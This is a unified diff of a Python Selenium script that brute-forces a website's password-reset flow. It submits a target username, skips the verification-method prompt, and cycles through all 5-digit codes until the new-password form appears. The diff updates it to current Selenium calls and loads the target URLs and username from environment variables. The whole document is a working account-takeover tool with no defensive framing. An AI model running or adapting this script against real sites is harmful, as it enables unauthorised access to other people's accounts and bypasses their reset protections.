@@ -1,46 +1,59 @@
 from selenium import webdriver
-import time
+from selenium.webdriver.common.by import By
+import time, os
 import random
 
-PASSWORD_RESET_UL = 'https://<some_website>/resetpassword'
-USER_NAME = '<username>'
+from dotenv import load_dotenv
+
+load_dotenv()
+
+
+url = os.getenv('URL')
+print(url)
+username = os.getenv('USERNAME')
+challenge_url = os.getenv('CHALLENGE_URL')
 
 # For the sake of an example i suppose that the reset codes of the webiste are just 5 digit numbers and they can't have a leading zero 
 verificationCodes = ['%05d' % i for i in range(10000,100000)]
 
 browser = webdriver.Chrome()
-browser.get()
-userId = browser.find_element_by_id('username')
-userId.send_keys(USER_NAME)
-sendCodeButton = browser.find_element_by_id('reset')
+browser.get(url)
+userId = browser.find_element(By.ID,'cnic')
+userId.send_keys(username)
+sendCodeButton = browser.find_element(By.NAME,'submit')
 sendCodeButton.click()
 time.sleep(3)
 foundCode = False
 
-
-
+# skip verification method option
+sendCodeButton = browser.find_element(By.NAME, 'submit')
+sendCodeButton.click()
 while not foundCode:
-    random.shuffle(verificationCodes)
-    code = verificationCodes[-1]
-    print('Trying', code)
-    browser.get(PASSWORD_RESET_UL)
-    emailCode = browser.find_element_by_id('generatedCode')
-    emailCode.clear()
-    emailCode.send_keys(code)
-    verifyCodeButton = browser.find_element_by_id('verify')
-    verifyCodeButton.click()
-    time.sleep(3)
-    emailCodeMsg = browser.find_element_by_id('email-code-msg')
-    print('%s @ %s' %(emailCodeMsg.text, code))
-    
-    if 'verified' in emailCodeMsg.text:
-        foundCode = True
-    elif 'incorrect' in emailCodeMsg.text:
-        verificationCodes.pop()
-        print('Trying again')
-    else:
-        continue
+    try:
+        random.shuffle(verificationCodes)
+        code = verificationCodes[-1]
+        #code = input('Enter code:')
+        print('Trying', code)
+        emailCode = browser.find_element(By.ID, 'code')
+        emailCode.clear()
+        emailCode.send_keys(code)
+        verifyCodeButton = browser.find_element(By.NAME, 'cnic')
+        verifyCodeButton.click()
+        #time.sleep(3)
+        try:
+            browser.find_element(By.ID, 'password1')
+            print('Found code', code)
+            foundCode = True
+        except:
+            verificationCodes.pop()
+            print('%d codes left' % len(verificationCodes))
+            pass
+    except Exception as e:
+        print(e)
+        time.sleep(5)
+    finally:
+        browser.get(challenge_url)
 
-    print('%d codes left' % len(verificationCodes))
-    time.sleep(10)
-
+input('enter new password')
+input('enter new password')
+input('enter new password')
